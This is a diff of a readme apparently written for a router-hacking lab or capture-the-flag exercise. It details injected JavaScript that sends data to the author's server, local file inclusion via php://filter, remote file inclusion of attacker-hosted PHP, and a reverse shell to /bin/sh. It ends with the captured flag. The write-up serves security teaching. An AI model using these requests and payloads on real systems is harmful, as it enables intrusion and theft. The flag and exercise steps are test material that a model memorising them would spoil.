@@ -1,15 +1,25 @@
 * Summary
-This is the readme file for Bob's Router project. I have successfully
-gained access to Bob's router's admin page, but failed to advance
-further. Nonetheless, here's all the work I've done.
+This is the readme file for Bob's Router project. I have gained access
+to Bob's router and successfully obtained the FLAG. I also developed a
+reverse-shell that can be deployed on arbitrary server with a public
+IP.
 
-* Reverse-shell in the FLAG Portal
+This document is separated into 8 sections. I firstly discussed how to
+control the FLAG portal using a reverse shell, then talk about how to
+inject script and guess the pin number of the router. Next I will
+discuss how to find more vulnerability from the url. Then I will
+discuss in detail the vulneability I found. Then I will talk about
+constructing a reverse shell. The last section is devoted to be a list
+of all the files that are either used or important to keep.
+
+* Control the FLAG Portal
 To launch csrf attack against Bob, we need to alter the content of the
 FLAG portal. To do this, I took advantage of the file upload
 vulnerability in the FLAG portal and uploaded a php script under the
 extension ".pdf.php". The script will open a socket to my own server
 at port 1234, and forward my command to "/bin/sh" and sends back all
-the output, creating a reverse-shell for me.
+the output, creating a reverse-shell for me. More details will be
+discussed in later sections.
 
 Then I start listening on port 1234 on my own server using the
 following netcat command:
@@ -276,24 +286,292 @@ correct pin is 6607 and the admin pages' html:
     <p style='color: white'>Router status: OK</p><p style='color: white'>Packets Dropped: 621/s</p><p style='color: white'>Upload speed: 8MB/s</p><p style='color: white'>Download speed: 17MB/s</p><p style='color: white'>Default Gateway: 192.168.1.1</p><p style='color: white'>Primary DNS: 8.8.4.4</p></html>
 #+END_SRC
 
-* Next step
+* Get reseponse URL
+The admin page does not look particularly interesting. There is no
+links nor forms in the html. But what could be interesting is the
+URL. It is important to realize that the page above isn't returned
+directly from http://router.local/login.php, but return by another
+endpoint via redirection. Here's my understanding of the redirection
+before knowing exactly how this works.
 
-The admin's page looks ok, but not interesting enough for us to find
-one more vulnerability for Remote Code Execution. The page contains
-zero input field and no further url references. One thing that I think
-is interesting is three status lines: Upload speed, Download speed and
-the default gateway. 
+#+BEGIN_SRC text
+               username, pin, PHPSESSID                    pass
+index.php  +--------------------------------> login.php ----------> ?.php
+   ^                                              +                   +
+   |                                              |                   |
+   |                                              |                   |
+   |                                              |                   |
+   |                                              |                   |
+   |    Wrong pin/wrong username/wrong sessid     |                   v
+   +----------------------------------------------+                 html
 
-I tried to make Bob send GET request to the default gateway at
-192.168.1.1, but no response came back, indicating that 192.168.1.1 in
-Bob's local network does not have port 80 open.
+#+END_SRC
 
-I suspect that there are some very important urls I am missing
-here. But I am not able to find them.
+In order to find out the actual endpoint that returns our html, we
+need to use the ~responseURL~ attribute of the ~XMLHttpRequest~.
 
-What I had in mind was to abuse some vulnerabilities to overide one
-particular php script with a reverse-shell like what I did with the
-FLAG Portal.
+So I changed the injection script to the following.
+
+#+BEGIN_SRC javascript
+...
+function tryGetAccess(sessid, xhr) {
+	$.ajax({
+		type: 'POST',
+		url: 'http://18.217.54.18:8888',
+		data: 'url=' + xhr.responseURL
+	});	
+}
+
+function process(response, currguess, lastsessid, xhr) {
+  	if (isGoodResponse(response)) {
+		sendSuccessfulMessage(currguess, response);
+              tryGetAccess(lastsessid, xhr);
+		return;
+	} else {
+      ...
+}
+...
+#+END_SRC
+
+This function will send to my server the actual url of the response,
+which is
+
+#+BEGIN_SRC text
+http://router.local/home.php?action=view&PHPSESSID=hnsle83eitaemuce4trqsainb0
+#+END_SRC
+
+This is interesting because not only do we know another endpoint
+~home.php~ we have an extra field ~action~ to play with.
+
+* Poke with the action field
+
+My first impression was that the "view" is some sort of option, and
+there might be other options (e.g "donwload", "upload"). So I tried
+many other option words but of course none of them worked. Then it
+occured to me that "view" might represent a file, and the ~home.php~
+script will simply call ~reafile()~ on whatever the action field
+is. So I tried to call
+
+#+BEGIN_SRC 
+http://router.local/home.php?action=./view&PHPSESSID=hnsle83eitaemuce4trqsainb0
+#+END_SRC
+
+And it worked! The same status information was sent back to me.
+
+So I am confimed that we can give any file name to the action field
+and php will read it for us. So I tried the following request.
+
+#+BEGIN_SRC 
+http://router.local/home.php?action=/etc/passwd&PHPSESSID=hnsle83eitaemuce4trqsainb0
+#+END_SRC
+
+But it didn't work. Regardless of how I changed the special characters
+like "/" to its url encoding, ~/etc/passwd~ would not be read and
+returned. I was out of option.
+
+However, during some googling, I came across the follow trick:
+[[https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/][phpFilterVulnerability]]. It says that PHP above version 5.0.0 has the
+function ~php://filter/convert.base64_encode/resource=<filename>~, which forces
+PHP to base64 encode any file with name ~<filename>.php~ before it is
+used in the require statement. So I tried the following request.
+
+#+BEGIN_SRC
+http://router.local/home.php?PHPSESSID=hnsle83eitaemuce4trqsainb0&action=php://filter/convert.base64_encode/resource=view
+#+END_SRC
+
+Then I get the following encoded string:
+
+#+BEGIN_SRC text
+PD9waHAKCWVjaG8gIjxwIHN0eWxlPSdjb2xvcjogd2hpdGUnPlJvdXRlciBzdGF0dXM6IE9LPC9wPiI7CgllY2hvICI8cCBzdHlsZT0nY29sb3I6IHdoaXRlJz5QYWNrZXRzIERyb3BwZWQ6ICIgLiBzdHJ2YWwocmFuZCgxMCw5MDApKSAuICIvczwvcD4iOwoJZWNobyAiPHAgc3R5bGU9J2NvbG9yOiB3aGl0ZSc+VXBsb2FkIHNwZWVkOiAiIC4gc3RydmFsKHJhbmQoMiwgMTApKSAuICJNQi9zPC9wPiI7CgllY2hvICI8cCBzdHlsZT0nY29sb3I6IHdoaXRlJz5Eb3dubG9hZCBzcGVlZDogIiAuIHN0cnZhbChyYW5kKDUsIDUwKSkgLiAiTUIvczwvcD4iOwoJZWNobyAiPHAgc3R5bGU9J2NvbG9yOiB3aGl0ZSc+RGVmYXVsdCBHYXRld2F5OiAxOTIuMTY4LjEuMTwvcD4iOwoJZWNobyAiPHAgc3R5bGU9J2NvbG9yOiB3aGl0ZSc+UHJpbWFyeSBETlM6IDguOC40LjQ8L3A+IjsKPz4K
+#+END_SRC
+
+It is obviously a base64 encoded string, so I decode it by
+
+#+BEGIN_SRC 
+echo PD9waHAKCWVjaG8gIjxwIHN0eWxlPSdjb2xvcjogd2hpdGUnPlJvdXRlciBzdGF0dXM6IE9LPC9wPiI7CgllY2hvICI8cCBzdHlsZT0nY29sb3I6IHdoaXRlJz5QYWNrZXRzIERyb3BwZWQ6ICIgLiBzdHJ2YWwocmFuZCgxMCw5MDApKSAuICIvczwvcD4iOwoJZWNobyAiPHAgc3R5bGU9J2NvbG9yOiB3aGl0ZSc+VXBsb2FkIHNwZWVkOiAiIC4gc3RydmFsKHJhbmQoMiwgMTApKSAuICJNQi9zPC9wPiI7CgllY2hvICI8cCBzdHlsZT0nY29sb3I6IHdoaXRlJz5Eb3dubG9hZCBzcGVlZDogIiAuIHN0cnZhbChyYW5kKDUsIDUwKSkgLiAiTUIvczwvcD4iOwoJZWNobyAiPHAgc3R5bGU9J2NvbG9yOiB3aGl0ZSc+RGVmYXVsdCBHYXRld2F5OiAxOTIuMTY4LjEuMTwvcD4iOwoJZWNobyAiPHAgc3R5bGU9J2NvbG9yOiB3aGl0ZSc+UHJpbWFyeSBETlM6IDguOC40LjQ8L3A+IjsKPz4K | base64 -d
+#+END_SRC
+
+And I obtained the source code of ~view.php~.
+
+#+BEGIN_SRC php
+<?php
+	echo "<p style='color: white'>Router status: OK</p>";
+	echo "<p style='color: white'>Packets Dropped: " . strval(rand(10,900)) . "/s</p>";
+	echo "<p style='color: white'>Upload speed: " . strval(rand(2, 10)) . "MB/s</p>";
+	echo "<p style='color: white'>Download speed: " . strval(rand(5, 50)) . "MB/s</p>";
+	echo "<p style='color: white'>Default Gateway: 192.168.1.1</p>";
+	echo "<p style='color: white'>Primary DNS: 8.8.4.4</p>";
+?>
+#+END_SRC
+
+Using the same method, I sends the following two requests
+
+#+BEGIN_SRC
+http://router.local/home.php?PHPSESSID=hnsle83eitaemuce4trqsainb0&action=php://filter/convert.base64_encode/resource=index
+#+END_SRC
+
+#+BEGIN_SRC
+http://router.local/home.php?PHPSESSID=hnsle83eitaemuce4trqsainb0&action=php://filter/convert.base64_encode/resource=home
+#+END_SRC
+
+And obtained the source code of both ~index.php~ and ~home.php~.
+
+#+BEGIN_SRC html
+<?php
+    // Added by zespirit in 2019: this header deals with CORS issues.
+    header("Access-Control-Allow-Origin: *");
+
+    session_start();
+    if ($_SESSION["username"] == "admin") {
+        // Good enough for me
+        header("location: home.php?action=view");
+    }
+
+    // try to open the file and if it doesn't exist run setup
+    if (!file_exists("admin.pin.txt") && !$_GET["dontsetup"]) {
+        header("location: setup.php");
+    }
+?>
+
+<html>
+    <head>
+        <link href='https://fonts.googleapis.com/css?family=Jura:400,500,600,300' rel='stylesheet' type='text/css'>
+        <link rel="stylesheet" type="text/css" href="index.css">
+    </head>
+
+    <body>
+        <div id="loginDiv">
+            <img src="http://hmapr.com/wp-content/uploads/2011/07/secure-lock.png"/>
+            <h1>CISCO Administration Portal</h1>
+            <h2>Authentication Required</h2>
+        </div>
+
+        <div id="loginForm">
+            <?php if($_GET["error"]) { ?>
+                <p class="error"><?php echo $_GET["error_string"]; ?></p>
+            <?php } ?>
+
+            <form id="login_form" action="login.php" method="POST" onsubmit="return validateLoginForm()" >
+                <input type="text" name="username" placeholder="jcarberry"/>
+                <input type="password" name="pin" placeholder="1234"/>
+                <p>I am not a robot <input type="radio" name="notRobot"/></p>
+                <input type="submit" value="Submit"/>
+            </form>
+        </div>
+    </body>
+    <script>
+        function validateLoginForm() {
+            form = document.getElementById("login_form");
+            if (!form["notRobot"].checked) {
+                alert("You must not be a robot in order to submit this form.");
+                return false;
+            }
+        }
+    </script>
+</html>
+#+END_SRC
+
+#+BEGIN_SRC html
+<?php
+    // Added by zespirit in 2019: this header deals with CORS issues.
+    header("Access-Control-Allow-Origin: *");
+
+    session_start();
+
+    // Validate the current session
+    if ($_SESSION["username"] !== "admin") {
+        // redirect to login
+        header("location: index.php");
+    }
+
+    // User is authenticated.
+?>
+
+<html>
+    <head>
+        <link href='https://fonts.googleapis.com/css?family=Jura:400,500,600,300' rel='stylesheet' type='text/css'>
+        <link rel="stylesheet" type="text/css" href="home.css">
+    </head>
+    <body>
+        <h1> Welcome, Admin! </h1>
+        <h2> Router Stats </h2>
+    </body>
+    <?php
+        $action = $_GET["action"];
+        if ($action) {
+            include($action . ".php");
+        }
+    ?>
+</html>
+#+END_SRC
+
+By examining ~home.php~, we found a file inclusion vulnerability and
+it also explains why ~home.php~ never reads ~/etc/passwd~.
+
+* File Inclusion Vulnerability
+The snippet ~include($action . ".php")~ leaves a file inclusion
+vulnearbility. We can substitute ~$action~ with a url to an arbitrary
+php file and made it execute it locally.
+
+To do that, I wrote a simple snippet to test it.
+
+#+BEGIN_SRC php
+<?php
+    phpinfo();
+?>
+#+END_SRC
+
+I save this file with name ~download.php~ at my own server with IP
+18.217.54.18. I opened apache in that server at put this file in the
+directory ~/var/www/html~. I verified that I can visit this file using
+browser. Then I change the request url on the FLAG Portal:
+
+#+BEGIN_SRC 
+http://router.local/home.php?PHPSESSID=hnsle83eitaemuce4trqsainb0&action=http://18.217.54.18/download
+#+END_SRC
+
+And I receives the result of ~phpinfo()~ from Bob's browser.
+
+* Develop a reverse shell
+I learned significantly how to write a reverse shell from an
+implementation from [[http://pentestmonkey.net/tools/php-reverse-shell][pentestmonkey]] (Although later I realized that I
+can write a python reverse-shell and invoke it via php's
+~system()/exec()~ function).
+
+First of all, we create a client socket connection to our (attacker's)
+machine at the desired IP and port. If this step fails, we exit the
+script.
+
+Second of all, we create a process in the victim's (router) machine
+which runs the binary ~/bin/sh~. But when creating it we ask it to
+replace the default stdin, stdout and stderr with three pipes: one for
+reading, two for writing.
+
+Then we create a while loop. Inside the loop, we leverage the system
+call ~select()~ (in php it's ~stream_select()~), which accepts three
+arrays of file descriptors, and will immediately return the number of
+available files to read/write. Note that this function will also
+removes all non-avialable files from the three arrays that are passed
+in as parameters.
+
+So we can then check whether the socket is readable (meaning the
+attacker has typed in some commands to the reverse-shell). If so, we
+pipe all the input to the pipe representing the stdin of the shell
+process.
+
+If the pipe of the process's stdout is readable, we read it and write
+it to the socket. This gives the attacker real-time outputs of the
+command that he/she just entered.
+
+If the pipe of the process's stderr is readble, we also read it and
+write it to the socket.
+
+Using this reverse shell and the shell improvement technique mentioned
+before, I got a reverse-shell to Bob's router and successfully found
+the flag.
+
+* FLAG
+6784c533-769d9ce5-e3d48611-dfe2ffc6
 
 * Files and how they are used
 
@@ -319,3 +597,11 @@ A folder with index.php, login.php and a few css files that simulates
 the router's web server's structure. I used it for testing
 brute-force-pin.js to check for any programming errors.
 
+** reverse-shell.php
+The reverse shell I used.
+
+** router_(home/index/view).php
+The router's php files.
+
+** FLAG
+The flag.
